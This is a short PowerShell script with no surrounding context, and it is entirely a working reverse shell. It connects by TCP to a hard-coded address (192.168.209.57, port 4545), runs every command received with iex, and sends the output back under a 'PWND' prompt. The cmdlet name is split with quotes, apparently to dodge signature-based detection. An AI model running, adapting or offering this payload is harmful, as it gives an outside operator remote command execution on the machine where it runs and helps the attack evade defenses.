$A='192.168.209.57';$B='4545';
$C=New-Obje''ct System.Net.Sockets.TCPClient($A,$B);$D=$C.GetStream();
[Byte[]]$E=0..65535|%{0};while(($F=$D.Read($E,0,$E.Length)) -ne 0){
$G=(New-Object System.Text.ASCIIEncoding).GetString($E,0,$F);
$H=(iex ". {$G} 2>&1" | Out-String);
$I=$H+'PWND '+' '+(pwd).Path+'->';
$J=([Text.Encoding]::ASCII).GetBytes($I);$D.Write($J,0,$J.Length);$D.Flush()};
$C.Close()
